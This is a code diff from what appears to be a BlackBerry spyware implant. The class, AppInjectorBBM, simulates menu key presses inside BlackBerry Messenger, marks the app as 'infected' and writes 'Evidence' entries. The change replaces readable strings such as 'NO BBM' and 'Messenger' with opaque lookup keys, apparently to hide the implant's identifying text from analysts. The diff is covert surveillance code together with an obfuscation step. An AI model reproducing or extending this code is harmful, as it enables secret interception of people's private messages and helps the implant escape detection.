@@ -12,6 +12,7 @@ package blackberry.module.im;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Messages;
 import blackberry.Singleton;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -29,7 +30,7 @@ import blackberry.utils.Utils;
  */
 public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private static AppInjectorBBM instance;
@@ -63,7 +64,7 @@ public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
 
     public boolean injectMenu() {
         //#ifdef DEBUG
-        debug.trace("injectMenu");
+        debug.trace("injectMenu"); //$NON-NLS-1$
         //#endif
         menu.addMenuBBM();
         return true;
@@ -71,7 +72,7 @@ public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
 
     public boolean deleteMenu() {
         //#ifdef DEBUG
-        debug.trace("deleteMenu");
+        debug.trace("deleteMenu"); //$NON-NLS-1$
         //#endif
         menu.removeMenuBBM();
         return true;
@@ -79,29 +80,29 @@ public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
 
     public boolean callMenuByKey() {
         //#ifdef DEBUG
-        debug.info("calling bbm menu: "
+        debug.info("calling bbm menu: " //$NON-NLS-1$
                 + UiApplication.getUiApplication().getActiveScreen());
         //#endif
 
         tries++;
         if (tries >= MAX_TRIES) {
             //#ifdef DEBUG
-            debug.error("callMenuByKey: too many tries");
+            debug.error("callMenuByKey: too many tries"); //$NON-NLS-1$
             //#endif
             if (tries == MAX_TRIES) {
-                Evidence.info("NO BBM");
+                Evidence.info(Messages.getString("1h.1")); //$NON-NLS-1$
             }
             return false;
         }
 
         //#ifdef DEBUG
-        debug.trace("callMenuByKey press menu key, try: " + tries);
+        debug.trace("callMenuByKey press menu key, try: " + tries); //$NON-NLS-1$
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(delay + tries * 20);
 
         //#ifdef DEBUG
-        debug.trace("callMenuByKey: pressRawKey, time=" + delay + tries * 20);
+        debug.trace("callMenuByKey: pressRawKey, time=" + delay + tries * 20); //$NON-NLS-1$
         //#endif
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
 
@@ -113,12 +114,12 @@ public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
     }
 
     public String getAppName() {
-        return "Messenger";
+        return Messages.getString("1a.a"); //"Messenger";
     }
 
     public void callMenuInContext() {
         //#ifdef DEBUG
-        debug.trace("callMenuInContext");
+        debug.trace("callMenuInContext"); //$NON-NLS-1$
         //#endif
         BBMMenuItem.getInstance().checkForConversationScreen();
 
@@ -133,7 +134,7 @@ public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
 
     public void setInfected(boolean value) {
         if (value) {
-            Evidence.info("BBM: " + tries);
+            Evidence.info(Messages.getString("1h.0") + tries); //$NON-NLS-1$
         }
         infected = value;
     }
@@ -145,7 +146,7 @@ public class AppInjectorBBM implements AppInjectorInterface, iSingleton {
 
     public void reset() {
         //#ifdef DEBUG
-        debug.trace("reset");
+        debug.trace("reset"); //$NON-NLS-1$
         //#endif
         tries = 0;
     }
